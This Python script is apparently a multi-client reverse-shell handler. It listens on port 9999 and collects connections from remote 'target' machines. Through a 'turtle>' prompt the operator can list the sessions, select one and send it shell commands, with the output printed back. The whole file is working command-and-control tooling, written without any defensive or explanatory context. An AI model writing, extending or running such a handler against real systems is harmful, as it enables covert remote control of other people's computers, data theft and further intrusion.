import socket
import threading
import time
from queue import Queue



NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()

all_connections = []
all_addresses = []
 

#create socket (allow two computer to connect)

def socket_create():
	try:
		global host
		global port
		global s
		host = ''
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print("socket creation error: " + str(msg))


# Bing socket to port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global s
		print("Binding socket to port: " + str(port))
		s.bind((host,port))
		s.listen(5)
	except socket.error as msg:
		print("socket binding error: " + str(msg) + "\n" + "retrying...")
		time.sleep(5)
		socket_bind()


# accept multiple connection from multiple server
def accept_connections():
	print("connection accept")
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]
	while 1:
		try:
			conn,address = s.accept()
			conn.setblocking(1)
			all_addresses.append(address)
			all_connections.append(conn)
			print("\nconnection has been established" + address[0])
		except:
			print("error accepting connections")


# Intractive promt for sending command remotely

def start_turtle():
	print("in start turtle")
	while True:
		cmd = input('turtle> ')
		if 'list' in cmd:
			list_connection()
		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)
		else:
			print("command not recognized")

# display all connection
def list_connection():
	results = ''
	for i, conn in enumerate(all_connections):
		try:
			conn.send(str.encode(" "))
			conn.recv(20480)
		except:
			del all_connections[i]
			del all_addresses[i]
			continue
		results += str(i) + '   ' + str(all_addresses[i][0]) + str(all_addresses[i][1]) + '\n'
	print('-----Client -------' + '\n' + results)


# Select a target client
def get_target(cmd):
	try:
		target = cmd.replace('select ','')
		target = int(target)
		conn = all_connections[target]
		print("you are now connectid to " + str(all_addresses[target][0]))
		print(str(all_addresses[target][0]) + '> ', end="")
		return conn
	except:
		print("Not a valid selection")
		return None


# connect with the remote target client
def send_target_commands(conn):
	while True:
		try:
			cmd = input()
			if len(str.encode(cmd)) > 0:
				conn.send(str.encode(cmd))
				client_responce = str(conn.recv(20480),"utf-8")
				print(client_responce, end="")
			if cmd == 'quit':
				break
		except:
			print("connection was lost")
			break


# Create workers threads
def create_workers():
	for _ in range(NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()

# Do the next job in the queue (one handles connections, other sends connamds)
def work():
	while True:
		x = queue.get()
		if x == 1:
			socket_create()
			socket_bind()
			accept_connections()
		if x == 2:
			start_turtle()
		queue.task_done()


# Each list item is a new job

def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x)
	queue.join()

create_workers()
create_jobs()
